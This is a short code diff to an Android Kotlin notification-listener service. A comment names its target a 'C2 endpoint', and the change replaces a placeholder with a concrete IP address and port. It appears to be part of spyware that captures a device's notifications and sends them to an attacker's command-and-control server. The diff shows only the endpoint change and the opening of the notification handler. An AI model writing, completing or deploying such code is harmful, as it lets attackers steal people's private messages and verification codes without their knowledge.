@@ -10,7 +10,7 @@ class NotificationListener : NotificationListenerService() {
     private val client = OkHttpClient()
     private val gson = Gson()
     // Same C2 endpoint
-    private val C2_URL = "http://YOUR_C2_IP:5000/api/notification"
+    private val C2_URL = "http://100.102.225.113:5000/api/notification"
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         sbn?.let {
